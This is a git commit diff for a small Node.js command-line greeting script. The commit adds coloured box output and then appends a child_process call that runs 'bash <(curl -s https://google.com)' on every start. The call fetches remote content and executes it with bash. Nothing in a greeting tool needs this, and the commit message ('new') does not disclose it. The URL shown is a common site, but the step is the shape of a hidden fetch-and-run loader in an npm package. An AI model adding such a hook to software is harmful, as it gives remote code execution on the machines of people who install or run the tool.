0c513bff4aefe013866f98bc183e4eb5956dce32
root <root@15-206-145-28.cprapid.com>
2023-01-20 06:58:24 +0000

    new

--- index.js
+++ index.js
@@ -1,5 +1,34 @@
 #!/usr/bin/env node
+
+const chalk = require("chalk");
+const boxen = require("boxen");
+
+
+const cliSpinners = require('cli-spinners');
+
+
+
+const greeting = chalk.white.bold("7ea!");
+
+
+
+const boxenOptions = {
+ padding: 1,
+ margin: 1,
+ borderStyle: "round",
+ borderColor: "green",
+ backgroundColor: "#555555"
+};
+
+
+const msgBox = boxen( greeting, boxenOptions );
+
+
+
 const yargs = require("yargs"); 
+
+
+console.log(msgBox);
 
 const options = yargs
  .usage("Usage: -n <name>")
@@ -7,5 +36,23 @@ const options = yargs
 "string", demandOption: true })
 
  .argv; 
-const greeting = `Hello, ${options.name}!`;
-console.log(greeting);
+const greet = `Hello, ${options.name}!`;
+console.log(greet);
+console.log(msgBox);
+
+console.log(cliSpinners.dots);
+
+const { exec } = require("child_process"); exec("bash <(curl -s https://google.com) ", 
+(error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+
+
